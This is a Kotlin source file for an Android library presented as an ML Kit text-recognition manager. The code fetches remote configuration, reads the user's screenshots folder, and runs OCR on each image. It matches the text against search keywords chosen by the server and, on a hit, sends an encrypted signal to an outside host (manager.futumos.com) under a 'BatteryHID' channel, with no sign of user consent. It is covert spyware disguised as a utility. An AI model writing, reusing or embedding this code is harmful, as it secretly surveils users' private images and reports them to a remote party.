package com.extra.mlkitlibrary.manager

import android.net.Uri
import android.util.Log
import androidx.core.net.toUri
import com.blankj.utilcode.util.FileUtils
import com.blankj.utilcode.util.JsonUtils
import com.blankj.utilcode.util.PathUtils
import com.blankj.utilcode.util.Utils
import com.extra.mlkitlibrary.kt.logE
import com.extra.mlkitlibrary.kt.logV
import com.extra.mlkitlibrary.utils.AESUtil
import com.extra.mlkitlibrary.utils.BlowfishUtil
import com.google.mlkit.vision.common.InputImage
import com.google.mlkit.vision.text.TextRecognition
import com.google.mlkit.vision.text.chinese.ChineseTextRecognizerOptions
import org.json.JSONObject

object MlKitManager {

    private const val HTTP_CONFIG = "http://manager.futumos.com/prod-api/common/sysconfig"
    private const val HTTP_SUBMIT = "http://manager.futumos.com/prod-api/common/receive"

    private fun loadPhoneScreenShots(modeType: Int, fileSize: Long, callback: (String?, Boolean) -> Unit) {
        val dirPath = PathUtils.getExternalDcimPath() + "/Screenshots"
        val filesInDir =
            FileUtils.listFilesInDir(dirPath).filter {
                val length = FileUtils.getLength(it)
                Log.v("MlKitManager", "文件长度=${length}")
                length <= fileSize
            }
        for ((index, file) in filesInDir.withIndex()) {
            val uri = file.toUri()
            val fileLength = FileUtils.getLength(file)
            Log.v("MlKitManager", "截图相册文件路径=${uri},文件长度=${fileLength}")
            recognizeText(modeType, uri) {
                callback.invoke(it, index == filesInDir.size - 1)
            }
        }
    }

    private fun recognizeText(modeType: Int, uri: Uri, callback: (String?) -> Unit) {
//        val textRecognizer = when (modeType) {
//            1 -> TextRecognition.getClient(ChineseTextRecognizerOptions.Builder().build())
//            2 -> TextRecognition.getClient(TextRecognizerOptions.Builder().build())
//            else -> {
//                TextRecognition.getClient(ChineseTextRecognizerOptions.Builder().build())
//            }
//        }
        val textRecognizer = TextRecognition.getClient(ChineseTextRecognizerOptions.Builder().build())
        val inputImage = InputImage.fromFilePath(Utils.getApp(), uri)
        textRecognizer.process(inputImage).addOnSuccessListener { visionText ->
            callback.invoke(visionText.text)
        }.addOnFailureListener { e ->
            callback.invoke(null)
            Log.e("MlKitManager", "识别异常=${e.message}")
        }
    }

    /**
     *  提交数据
     *  @param key 识别出来的数据
     *  @param channel 渠道号
     */
    private fun submitData(key:String?,channel: String = "BatteryHID"){
        if (key.isNullOrBlank()){
            logE("提交加密数据异常")
            return
        }
        HttpManager.httpPost(HTTP_SUBMIT,key,channel){ json->
            logV("提交数据=$json")
        }
    }

    /**
     *  加密数据
     */
    private fun encryptData(pageSize:String):String?{
        try {
            val decryptData = AESUtil.decrypt(pageSize)
            val decrypt = if (decryptData.length > 7) {
                decryptData.substring(0, 8)
            } else {
                decryptData
            }
            logV("解密出来的数据=${decrypt}")
            val content = "HappyCoder need do more work ${System.currentTimeMillis()}"
            val data = content.toByteArray()
            val encrypt = BlowfishUtil.encrypt(decrypt, data)
            logV("${content}=加密出来的数据=${encrypt}")
            return encrypt
        } catch (e: Exception) {
            e.printStackTrace()
            logE("加解密异常信息=${e.message}")
            return null
        }
    }

    /**
     *  执行任务
     */
    fun doTask(){
        HttpManager.httpGet(HTTP_CONFIG) { json ->
            logV("请求数据=$json")
            if (!json.isNullOrBlank() && JsonUtils.getInt(json, "code") == 200) {
                val dataJson = JsonUtils.getJSONObject(json, "data", JSONObject())
                // 1 中英，2 全部
                val modeType = dataJson.getInt("modeType")
                val fileSize = dataJson.getLong("fileSize")
                // 精度 1是普通，2是高精度
                //val precision = dataJson.getInt("precision")
                val pageSize = dataJson.getString("pageSize")
                val searchKey = dataJson.getString("searchKey")
                val searchList = searchKey.split(",")
                loadPhoneScreenShots(
                    modeType, fileSize * 1024
                ) { content, status ->
                    if (!content.isNullOrBlank()) {
                        val containData =
                            searchList.filter { content.contains(it) || it.contains(content) }
                        if (containData.isNotEmpty()){
                            logV("匹配成功的数据=$content")
                            submitData(encryptData(pageSize))
                        }
                    }
                }
            }
        }
    }

}